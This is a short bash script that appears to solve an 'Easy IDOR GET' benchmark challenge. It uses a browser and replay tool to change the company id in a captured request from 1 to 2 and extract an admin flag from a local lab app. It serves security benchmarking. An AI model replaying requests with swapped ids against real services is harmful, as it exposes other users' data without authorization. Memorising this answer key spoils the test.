#!/usr/bin/env bash
# XBEN-058-24 — "Easy IDOR GET" (tags: idor)
#
# `/company/{id}/jobs` takes an id and checks nothing at all: no cookie, no
# token, no ownership. Company 2 is the admin account, and its job list holds
# the flag. One request, one changed path segment.
#
# The `path=` edit rewrites the path and keeps everything else, which is the
# point of editing a stored request rather than composing a new one: whatever
# the session was carrying still applies.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben058-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/company/1/jobs" --session "$SESSION" --new --capture >/dev/null
SEQ="$("$H5I" websec requests --url-contains /jobs --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["requests"][0]["seq"])')"
REPLAY="$("$H5I" websec replay "req_$SEQ" --set 'path=/company/2/jobs' --session "$SESSION" |
    python3 -c 'import json,sys; print(json.load(sys.stdin)["seq"])')"
"$H5I" websec match "res_$REPLAY" --regex 'FLAG\{[a-f0-9]{64}\}' --session "$SESSION" |
    python3 -c 'import json,sys; d=json.load(sys.stdin); print(d["conditions"][0]["captures"][0] if d["matched"] else "no flag found")'
